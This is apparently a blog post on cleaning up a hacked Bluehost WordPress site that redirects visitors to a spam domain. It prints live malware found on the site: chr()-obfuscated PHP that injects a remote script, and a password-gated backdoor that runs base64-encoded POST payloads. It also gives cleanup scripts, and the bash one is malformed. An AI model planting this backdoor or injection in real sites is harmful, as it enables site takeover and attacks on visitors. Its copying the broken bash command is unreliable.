---
title: Wordpress site hacked and redirects to spam site?
date: "2021-03-26"
description: "My Wordpress site hosted on Bluehost got hacked and now all my sites are redirecting to a spam site."
---

## Problem: Wordpress Site Hacked and Now Redirects to Spam Site

I have a number of sites hosted on a Bluehost account, and, suddenly, they were all redirecting users to some spam site. Both the subdirectories and my root site seemed to be hit.

## Steps to Fix the Problem

1. We tried working with Bluehost. They seemed to fix the problem on their end by deactivating all plugins. However, this obviously broke all of our sites (including client sites!). 
2. We began to reactivate plugins one by one on a particular site that we own, to troubleshoot what was causing the problem. As a couple of plugins were reactivated (Thrive Optimize in particular), the spammy redirection suddenly resumed specifically onthe `/wp-admin/` route. This meant we couldn't even undo the accidental activation!
3. We then downloaded our site directory from the `public_html` folder (this was a sub-directory site) to explore what the problem could be.
   1. We first searched for the URL that the user was being redirected to (`https://tron.talkingaboutfirms.ga`), but this turned up nothing, as expected.
   2. Then we inspected a number of files that a user might land on while navigating to the site initially, including an `index.php` file, which said:

```php
<?php
echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(116).chr(114).chr(111).chr(110).chr(46).chr(116).chr(97).chr(108).chr(107).chr(105).chr(110).chr(103).chr(97).chr(98).chr(111).chr(117).chr(116).chr(102).chr(105).chr(114).chr(109).chr(115).chr(46).chr(103).chr(97).chr(47).chr(109).chr(97).chr(105).chr(110).chr(46).chr(106).chr(115).chr(63).chr(115).chr(61).chr(53).chr(53).chr(51).chr(38).chr(98).chr(61).chr(50).chr(38).chr(99).chr(105).chr(100).chr(61).chr(49).chr(49).chr(49).chr(52).chr(49).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);die();
?>
```

The PHP function `chr()` is a character encoding. When this file’s contents are decoded (i.e. the script is executed), the resulting string is:

```html
<script src='https://tron.talkingaboutfirms.ga/main.js?s=553&b=2&cid=11141' type='text/javascript'></script>
```

Found it.

The problem is pretty clear. Why is my Wordpress site redirecting to a spam site? **This particular hack involved uploading a malicious index.php to every directory it could access, and so any folder you would access would in theory redirect you to the spammy site.**

## Fix it with Bash

To mass delete these index files in bash, use this hand bash script (credit: [Martin Beckett](https://stackoverflow.com/questions/4529134/delete-files-with-string-found-in-file-linux-cli))

```bash
find . | xargs grep -l echo chr(60).chr(115).chr(99) | awk '{print "rm "${1}}' > doit.sh
```

*Note: we didn't have complete success with this script in zshell (on Macs these days).*

## Fix it with Python

To use this python script, navigate to the directory you want to clean up, (on Mac type `cd ` with a space and then drag in the folder you want to clean up from Finder). Then open Python by typing `python`. Then paste in this script:

```python
import os
for subdir, dirs, files in os.walk(os.getcwd()): # Note: operates within the current wording directory (cwd) and all subdirectories/files
    for filename in files:
        filepath = subdir + os.sep + filename

        with open(filepath) as currentOpenFile:
            try:
                for line in currentOpenFile:
                
                    if 'echo chr(60).chr(115)' in line: # Check if any line in a file contains this string, which is the beginning of the hacked index.php file content
                        os.remove(filepath)
                        print('Removed: {0}'.format(filepath))
            except:
                print('failed on {0}'.format(filepath))
```

## Possible Cause: Thrive Themes Plugins?

As a side-note, this particular vulnerability may be related to a Thrive Themes unused-Zapier-API-key exploit. See [source](https://rootdaemon.com/2021/03/25/hackers-start-exploiting-recent-vulnerabilities-in-thrive-theme-wordpress-plugins/).

## Update

Here is the malicious code that was causing the problem (i.e. going through my site directory and creating or updating `index.php` files everywhere):

```php
if(isset($_POST['zi']) 
    && md5($_POST['zi']) == base64_decode('M2UwZWFhNWFlNGE1NzRjMGYzYjEyOTRmZGQwZTg1ZTQ=') ) {
    $lt = base64_decode($_POST['a']);file_put_contents('lte_','<?php '.$lt);$lt='lte_';
if(file_exists($lt)){
    include($lt);unlink($lt);die();
}
} else {
    echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(115).chr(116).chr(105).chr(99).chr(107).chr(46).chr(116).chr(114).chr(97).chr(118).chr(101).chr(108).chr(105).chr(110).chr(115).chr(107).chr(121).chr(100).chr(114).chr(101).chr(97).chr(109).chr(46).chr(103).chr(97).chr(47).chr(97).chr(110).chr(97).chr(108).chr(121).chr(116).chr(105).chr(99).chr(115).chr(46).chr(106).chr(115).chr(63).chr(115).chr(61).chr(48).chr(55).chr(38).chr(98).chr(61).chr(51).chr(52).chr(53).chr(38).chr(99).chr(105).chr(100).chr(61).chr(55).chr(52).chr(53).chr(55).chr(45).chr(56).chr(53).chr(45).chr(50).chr(51).chr(52).chr(54).chr(55).chr(56).chr(56).chr(45).chr(50).chr(52).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);
}
```

Note: you will want to make sure that you don't delete index files in their entirety if they are only partly malicious code. Wordpress has important index files you will need to hang onto. If you accidentally delete one of these, you can find them in the [Wordpress source code](https://github.com/WordPress/WordPress).
